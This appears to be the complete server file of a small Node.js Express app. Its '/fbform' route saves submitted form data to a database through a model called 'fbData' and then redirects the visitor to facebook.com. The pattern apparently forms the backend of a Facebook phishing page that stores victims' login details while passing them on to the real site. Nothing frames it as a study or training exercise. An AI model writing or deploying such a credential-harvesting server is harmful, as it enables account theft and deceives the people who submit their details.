const express = require ('express');
const dotenv = require ('dotenv');
dotenv.config();

const path = require ('path');
const database = require ('./database/dbConn');
const fbData = require ('./models/userSchema');
const { send } = require('process');

const port = 21000;
const app = express();

//setting tempalte engine
app.set('view engine', 'hbs');

//accessing public folder
const publicPath = path.join(__dirname, ("public"))
app.use(express.static(publicPath));

//middleware
app.use(express.urlencoded({extended:false}));

app.get('/', (req, res)=>{
    res.render('index');
})

//storing user data in database
app.post('/fbform',async (req ,res)=>{
  try {
    const sendData = fbData(req.body);
    await sendData.save();
    res.redirect('https://facebook.com');
    
  } catch (error) {
    res.render('fbform',{
        error : 'Please fill all the details !'
    })
    
  }
})

app.listen(port, (req ,res)=>{
    console.log(`Server is running on port no : ${port}`);
})
